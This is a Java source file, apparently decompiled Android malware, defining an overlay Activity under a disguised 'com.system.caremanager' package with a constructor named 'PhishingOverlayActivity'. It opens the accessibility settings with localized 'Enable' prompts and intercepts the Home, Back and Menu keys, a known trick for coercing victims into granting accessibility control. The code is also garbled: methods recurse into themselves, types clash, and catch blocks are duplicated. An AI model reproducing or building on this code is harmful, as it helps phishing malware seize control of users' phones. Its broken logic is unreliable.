package com.system.caremanager;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class OverlayActivity extends Activity {

    static Context myctx;
    public String localeForAccessibility;

    static {
        // Static initialization block
    }

    public PhishingOverlayActivity() {
        String str = "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644";
        this.localeForAccessibility = str;
        return;
    }

    public void finish() {
        this.finishAndRemoveTask();
        return;
    }

    public String localeTextAccessibility() {
        try {
            JSONObject jSONObject = new JSONObject();
            String localeForAccessibility = this.localeForAccessibility;
            Locale result = Locale.getDefault();
            String result2 = result.getLanguage();
            String result3 = jSONObject.getString(result);
            return result;
            } catch (Exception e) {
                e.printStackTrace();
            String str = "Enable";
            return str;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onBackPressed() {
        this.onBackPressed();
        return;
    }

    public void onCreate(Bundle param1) {
        this.onCreate(param1);
        Intent intent = new Intent();
        String str = "android.settings.ACCESSIBILITY_SETTINGS";
        this.startActivity(intent);
        this.finish();
        return;
    }

    public void onDestroy() {
        this.onDestroy();
        return;
    }

    public boolean onKeyDown(int param1, KeyEvent param2) {
        int val = 3;
        if (param1 != val) {
            // branch: cond_0
        }
        // continue loop -> :goto_0
        int val2 = 4;
        if (param1 != val2) {
            // branch: cond_1
        }
        // continue loop -> :goto_0
        int val3 = 82;
        if (param1 != val3) {
            // branch: cond_2
        }
        // continue loop -> :goto_0
        return null;
    }

    protected void onStop() {
        this.onStop();
        return;
    }

}